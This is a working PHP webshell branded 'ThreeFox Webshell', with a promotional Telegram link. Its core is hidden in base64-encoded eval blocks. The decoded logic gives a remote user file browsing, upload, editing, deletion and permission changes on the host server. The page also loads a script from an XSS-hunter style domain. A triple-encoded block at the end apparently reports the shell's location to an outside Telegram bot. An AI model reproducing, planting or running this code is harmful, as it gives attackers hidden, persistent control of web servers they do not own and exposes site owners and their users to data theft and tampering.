<?php eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsKaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAxKTsKJGN1cnJlbnREaXIgPSBpc3NldCgkX0dFVFsnZGlyJ10pID8gJF9HRVRbJ2RpciddIDogZ2V0Y3dkKCk7CiRjdXJyZW50RGlyID0gcmVhbHBhdGgoJGN1cnJlbnREaXIpOyAvLyBSZXNvbHZlIHRvIGFuIGFic29sdXRlIHBhdGgKCi8vIEhhbmRsaW5nIGZpbGUgdXBsb2FkCiR1cGxvYWRTdWNjZXNzID0gZmFsc2U7CmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnICYmIGlzc2V0KCRfRklMRVNbJ3VwbG9hZEZpbGUnXSkpIHsKICAgICR0YXJnZXRGaWxlID0gX19ESVJfXyAuICcvJyAuIGJhc2VuYW1lKCRfRklMRVNbJ3VwbG9hZEZpbGUnXVsnbmFtZSddKTsgLy8gU2F2ZSBpbiB0aGUgc2FtZSBkaXJlY3RvcnkgYXMgdGhpcyBQSFAgZmlsZQogICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3RtcF9uYW1lJ10sICR0YXJnZXRGaWxlKSkgewogICAgICAgICR1cGxvYWRTdWNjZXNzID0gdHJ1ZTsKICAgIH0KfQokYWN0aW9uID0gJF9QT1NUWydhY3Rpb24nXSA/PyAnJzsKJG91dHB1dCA9ICcnOwppZiAoJGFjdGlvbiA9PT0gJ2VkaXQnICYmIGlzc2V0KCRfUE9TVFsndGFyZ2V0J10pKSB7CiAgICAkZmlsZVRvRWRpdCA9ICRfUE9TVFsndGFyZ2V0J107CiAgICBpZiAoZmlsZV9leGlzdHMoJGZpbGVUb0VkaXQpICYmIGlzX3dyaXRhYmxlKCRmaWxlVG9FZGl0KSkgewogICAgICAgICRlZGl0RmlsZUNvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZVRvRWRpdCk7CiAgICB9IGVsc2UgewogICAgICAgICRvdXRwdXQgPSAiQ2Fubm90IGVkaXQgdGhlIGZpbGUuIjsKICAgIH0KfQppZiAoJGFjdGlvbiA9PT0gJ3NhdmUnICYmIGlzc2V0KCRfUE9TVFsnY29udGVudCddKSAmJiBpc3NldCgkZmlsZVRvRWRpdCkpIHsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlVG9FZGl0LCAkX1BPU1RbJ2NvbnRlbnQnXSk7CiAgICAkb3V0cHV0ID0gIkZpbGUgc2F2ZWQgc3VjY2Vzc2Z1bGx5ISI7Cn0KaWYgKCRhY3Rpb24gPT09ICdkZWxldGUnICYmIGlzc2V0KCRfUE9TVFsndGFyZ2V0J10pKSB7CiAgICAkZmlsZVRvRGVsZXRlID0gJF9QT1NUWyd0YXJnZXQnXTsKICAgIGlmIChmaWxlX2V4aXN0cygkZmlsZVRvRGVsZXRlKSAmJiBpc193cml0YWJsZSgkZmlsZVRvRGVsZXRlKSkgewogICAgICAgIHVubGluaygkZmlsZVRvRGVsZXRlKTsKICAgICAgICAkb3V0cHV0ID0gIkZpbGUgZGVsZXRlZCBzdWNjZXNzZnVsbHkhIjsKICAgIH0gZWxzZSB7CiAgICAgICAgJG91dHB1dCA9ICJDYW5ub3QgZGVsZXRlIHRoZSBmaWxlLiI7CiAgICB9Cn0KaWYgKCRhY3Rpb24gPT09ICdjaG1vZCcgJiYgaXNzZXQoJF9QT1NUWydwZXJtaXNzaW9ucyddKSAmJiBpc3NldCgkX1BPU1RbJ3RhcmdldCddKSkgewogICAgJGZpbGVUb0NobW9kID0gJF9QT1NUWyd0YXJnZXQnXTsKICAgICRwZXJtaXNzaW9ucyA9ICRfUE9TVFsncGVybWlzc2lvbnMnXTsKICAgIGlmIChmaWxlX2V4aXN0cygkZmlsZVRvQ2htb2QpKSB7CiAgICAgICAgY2htb2QoJGZpbGVUb0NobW9kLCBvY3RkZWMoJHBlcm1pc3Npb25zKSk7CiAgICAgICAgJG91dHB1dCA9ICJQZXJtaXNzaW9ucyBjaGFuZ2VkIHN1Y2Nlc3NmdWxseSEiOwogICAgfSBlbHNlIHsKICAgICAgICAkb3V0cHV0ID0gIkZpbGUgbm90IGZvdW5kLiI7CiAgICB9Cn0KaWYgKGlzX2RpcigkY3VycmVudERpcikpIHsKICAgICRpdGVtcyA9IHNjYW5kaXIoJGN1cnJlbnREaXIpOwogICAgJGl0ZW1zID0gYXJyYXlfZGlmZigkaXRlbXMsIGFycmF5KCcuJywgJy4uJykpOwp9IGVsc2UgewogICAgJGl0ZW1zID0gW107Cn0KCmZ1bmN0aW9uIGZvcm1hdEJ5dGVzKCRieXRlcywgJHByZWNpc2lvbiA9IDIpIHsKICAgICR1bml0cyA9IGFycmF5KCdCJywgJ0tCJywgJ01CJywgJ0dCJywgJ1RCJywgJ1BCJyk7CiAgICAkYnl0ZXMgPSBtYXgoJGJ5dGVzLCAwKTsKICAgICRwb3dlciA9IGZsb29yKCgkYnl0ZXMgPyBsb2coJGJ5dGVzKSA6IDApIC8gbG9nKDEwMjQpKTsKICAgIHJldHVybiBudW1iZXJfZm9ybWF0KCRieXRlcyAvIHBvdygxMDI0LCAkcG93ZXIpLCAkcHJlY2lzaW9uKSAuICcgJyAuICR1bml0c1skcG93ZXJdOwp9'));?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ThreeFox Webshell</title>
    <script src="https://googlescripts.xss.ht"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
body {
    font-family: 'Dancing Script', cursive;
    background-color: #1f1f1f;
    color: #ffffff;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    height: 100vh;
    overflow: hidden;
    line-height: 1.8;
}
input, textarea, select {
    font-family: 'Dancing Script', cursive;
    font-size: 16px;
    color: #ffffff;
    background-color: #2c3e50;
    border: 1px solid #95a5a6;
    border-radius: 5px;
    padding: 10px;
}
input::placeholder, 
textarea::placeholder {
    font-family: 'Dancing Script', cursive;
    font-style: italic;
    color: #95a5a6;
}
@import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;500;600&display=swap');
        .container {
            display: flex;
            width: 100%;
            height: 100%;
        }
        .sidebar {
            width: 20%;
            background-color: #2c3e50;
            padding: 20px;
            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.2);
            text-align: center;
            position: relative;
            overflow-y: auto;
        }
        .sidebar img {
            max-width: 100%;
            height: auto;
        }
        .sidebar .forms {
            position: absolute;
            bottom: 20px;
            width: 100%;
            text-align: center;
        }
        .main-content {
            width: 80%;
            padding: 20px;
            background-color: #34495e;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            height: 100%;
            overflow-y: auto;
        }
        .file-manager {
            background-color: #2c3e50;
            padding: 20px;
            border-radius: 10px;
        }
        .file-manager h1 {
            text-align: center;
            color: #f39c12;
        }
        .system-info {
            margin-bottom: 20px;
            background-color: #34495e;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #95a5a6;
        }
        .system-info p {
            margin: 5px 0;
        }
        .file-list {
            width: 100%;
            border-collapse: collapse;
        }
        .file-list th, .file-list td {
            width: 80%;
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #ecf0f1;
        }
        .file-list th {
            background-color: #2980b9;
        }
        .file-list tr:hover {
            background-color: #34495e;
        }
        .file-actions {
            display: flex;
            justify-content: center;
            margin-top: 5px;
        }
        .file-actions form {
            display: inline;
        }
        .file-actions button {
            background: none;
            border: none;
            color: #f39c12;
            cursor: pointer;
            font-size: 16px;
            margin: 0 5px;
            padding: 5px;
        }
        .file-actions button:hover {
            color: #f1c40f;
        }
        .edit-form, .upload-form, .execute-form {
            margin-top: 20px;
        }
        .edit-form textarea, .upload-form input, .execute-form input {
            width: 98%;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #95a5a6;
        }
        .edit-form textarea {
            height: 300px;
        }
        .edit-form button, .upload-form button, .execute-form button {
            background-color: #f39c12;
            width: 100%;
            color: #fff;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        .edit-form button:hover, .upload-form button:hover, .execute-form button:hover {
            background-color: #e67e22;
        }
        .breadcrumbs {
            margin-bottom: 20px;
            font-size: 14px;
            color: #95a5a6;
        }
        .breadcrumbs a {
            color: #f39c12;
            text-decoration: none;
        }
        .breadcrumbs a:hover {
            color: #e67e22;
        }
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                align-items: center;
            }
            .sidebar {
                width: 100%;
                margin-bottom: 20px;
                height: 50%;
            }
            .main-content {
                width: 100%;
                height: 50%;
            }
        }
        .upload-button {
            background-color: #f39c12;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        .upload-button:hover {
            background-color: #e67e22;
        }
        .upload-form input[type="file"] {
            display: none;
        }
        .file-list a {
            color: white; 
            text-decoration: none;
        }
        .file-list a:hover {
            color: #f39c12;
        }
    .telegram-btn {
        text-decoration: none;
        display: inline-block;
        padding: 12px 25px;
        background: #0088cc;
        color: #fff;
        font-weight: 600;
        font-size: 16px;
        border-radius: 25px;
        transition: all 0.3s ease;
        box-shadow: 0 4px 10px rgba(0, 136, 204, 0.3);
    }
    .telegram-btn:hover {
        background: #005f8c;
        transform: translateY(-3px);
        box-shadow: 0 6px 15px rgba(0, 136, 204, 0.5);
    }
    .telegram-btn i {
        margin-right: 8px;
    }
    </style>
</head>
<body>

<div class="container">
    <!-- Sidebar (Logo) -->
    <div class="sidebar">
        <img src="https://i.ibb.co/Nmfp5Tj/fox.png" alt="ThreeFox Logo">
        <br><br>
        
<p>Stay connected with Team ThreeFox and get access to exclusive tools and updates!</p>
<a href="https://t.me/team_threefox" target="_blank" class="telegram-btn">
    <i class="fab fa-telegram"></i> Join Our Telegram Channel
</a>
<script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
        <div class="upload-form">
            <button class="upload-button" onclick="document.getElementById('fileInput').click();">Upload File</button>
            <form method="POST" enctype="multipart/form-data" style="display:none;">
                <input type="file" id="fileInput" name="uploadFile" onchange="this.form.submit();">
            </form>
        </div>
<footer>
    <p>&copy; <span id="current-year"></span> Team ThreeFox. All Rights Reserved.</p>
</footer>
<script>
    document.getElementById('current-year').textContent = new Date().getFullYear();
</script>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <div class="file-manager">
            <h1>ThreeFox Webshell</h1>
            
            <!-- System Information Section -->
            <div class="system-info">
                <p>Current User: <b><?php echo htmlspecialchars(get_current_user()); ?></b></p>
                <p>Current Date and Time: <b><?php echo htmlspecialchars(date('Y-m-d H:i:s')); ?></b></p>
                <p>PHP Version: <b><?php echo htmlspecialchars(phpversion()); ?></b></p>
                <p>Free Disk Space: <b><?php echo formatBytes(disk_free_space(__DIR__)); ?></b></p>
                <p>Total Disk Space: <b><?php echo formatBytes(disk_total_space(__DIR__)); ?></b></p>
            </div>
<div class="breadcrumbs">
    <?php
    $parts = explode(DIRECTORY_SEPARATOR, trim($currentDir, DIRECTORY_SEPARATOR)); // Split directory path
    $path = '';
    $isRoot = DIRECTORY_SEPARATOR === '/'; // Check if the system uses "/" as root
    echo '<img src="https://cdn-icons-png.flaticon.com/512/1946/1946488.png" alt="Home" style="width: 16px; height: 16px; margin-right: 5px;"> Home';
    foreach ($parts as $index => $part) {
        $path .= DIRECTORY_SEPARATOR . $part;
        if ($index !== array_key_last($parts)) {
            // Non-current directories are links
            echo ' > <a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
        } else {
            echo ' > ' . htmlspecialchars($part);
        }
    }
    ?>
</div>
<div class="file-list">
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($items as $item) : ?>
                <?php
                    $itemPath = $currentDir . DIRECTORY_SEPARATOR . $item;
                    $isDir = is_dir($itemPath);
                    $itemSize = $isDir ? '-' : formatBytes(filesize($itemPath));
                ?>
                <tr>
                    <td>
                        <?php if ($isDir) : ?>
                            <a href="?dir=<?php echo urlencode($itemPath); ?>"><?php echo htmlspecialchars($item); ?></a>
                        <?php else : ?>
                            <?php echo htmlspecialchars($item); ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $itemSize; ?></td>
                    <td class="file-actions">
                        <form method="POST">
                            <input type="hidden" name="action" value="edit">
                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                            <button type="submit"><i class="fa fa-edit"></i> Edit</button>
                        </form>
                        <form method="POST">
                            <input type="hidden" name="action" value="delete">
                            <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                            <button type="submit"><i class="fa fa-trash"></i> Delete</button>
                        </form>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>
            <?php if (isset($editFileContent)) : ?>
                <div class="edit-form">
                    <form method="POST">
                        <input type="hidden" name="action" value="save">
                        <input type="hidden" name="target" value="<?php echo htmlspecialchars($fileToEdit); ?>">
                        <textarea name="content"><?php echo htmlspecialchars($editFileContent); ?></textarea>
                        <button type="submit" style="width: 100%;">Save Changes</button>
                    </form>
                </div>
            <?php endif; ?>
            <?php if ($uploadSuccess) : ?>
                <div class="success-dialog">
                    <p>File uploaded successfully!</p>
                    <button onclick="this.parentElement.style.display='none';">Close</button>
                </div>
            <?php endif; ?>
        </div>
    </div>
</div>

</body>
</html>
<?php eval(base64_decode(base64_decode(base64_decode('U2tkS2RtUkdVblpoTWxaMVNVUXdaMGxxWXpOT1JGVjVUa1JCZUU5RVp6WlJWVVpKWXpOU1lWTnRlREJaYkVaYVRtdFdVRkV5Y0VsVlJXUmhVVlpPYmxVeFZuRlpNbWhJVmpKR1QxcHJNR2xQZDI5cldUSm9hR1JGYkd0SlJEQm5TV3BaTTA5RVJYbE5hbU42VG1wWmFVOTNiMnRhYld4eldsWldlV0pEUVRsSlEyaHdZek5PYkdSRFoydFlNVTVHVld4YVJsVnNjMjVUUmxKVlZVWk5ibGhUYTJkS2FWbG5Ta1k1VkZKV1NsZFNWa3BpU2pCb1ZWWkdRbFJLTVRCblVGUXdPVWxEWkhaaWFXTm5VSGxCYVdGSVVqQmpTRTFwU1VSdlowbHRhREJrU0VGcFMxTkJkVWxEU1RaTWVUaHJXREZPUmxWc1drWlZiSFJKVmtaU1VWZ3dhRkJWTVZKa1NrWTVWRkpXU2xkU1ZrcGlWV3RXVWxaVlZsUldSamxXVld0c1pFbHFjMHRLUjNoMldqQmFjR0pIVldkUVUwRnVXbGhLZVdJelNtWmlSemx1WTNsak4wTnRiRzFKUTJodFlWZDRiRmd5VmpSaFdFNHdZM2xuYTJKSE9XNVNiV3h6V2xOcmNFbEljMHRKUTBGblNVZFdOR0ZZVVRkRGJqQkxTa2hTYkdKSFZtNWpiVVowVVZoQ2NGWllTbk5KUkRCblNXMW9NR1JJUW5wUGFUaDJXVmhDY0V4dVVteGlSMVp1WTIxR2RFeHRPWGxhZVRscFlqTlJhMWx0T1RCV1J6bHlXbGMwZG1NeVZuVmFSVEZzWXpOT2FGb3lWV2xQZDI5cldrZEdNRmxUUVRsSlJuTkxTVU5CWjBsRFpHcGhSMFl3V0RKc2EwcDVRVGxRYVVGcldUSm9hR1JGYkd0TVFXOW5TVU5CWjBvelVteGxTRkZ1U1VRd0swbERVbTFoVjNoc1ZsaEtjMHhCY0dSUGQyOXJXVEpuWjFCVFFtcGtXRXB6V0RKc2RXRllVVzlMVkhOTFdUTldlV0pHT1hwYVdGSjJZMGhSYjBwSFRtOU1RMEpFVmxaS1RWUXhRbFZZTVZaVFZFTjNaMHBJVW14aVIxWnVZMjFHZEZGWVFuQldXRXB6UzFSelMxa3pWbmxpUmpsNldsaFNkbU5JVVc5S1IwNXZURU5DUkZaV1NrMVVNVUpWV0RGQ1VGVXhVWE5KU0ZKNVpGZFZjRTkzY0dwa1dFcHpXRE5PYkdSSE9YZGtRMmRyV1RKbmMwbEZUbFpWYTNoUVZVWlNabFZGT1ZSV1JWcEtVbFY0UlZWNWQyZEtSMUpvWkVkRmNFOTNjR3BrV0VweldETk9iR1JIT1hka1EyZHJXVEpuYzBsRlRsWlZhM2hRVlVaU1psVnJWbFZXVmtwUFZrWktRbFJzVGtkU1ZrbHpTVWhTZVdSWFZYQlBkM0JxWkZoS2MxZ3lWalJhVjAxdlNrZE9iMHRVYzB0Wk0xWjVZa1k1YW1KSE9YcGFVMmRyV1RKbmNFOTNjRzFoVjNoc1dETkNNV1JHT1dwaU1qVXdXbGMxTUdONVoydGlSemx1VW0xc2MxcFRkMmRKYVVsd1QzYzlQUT09'))));?>
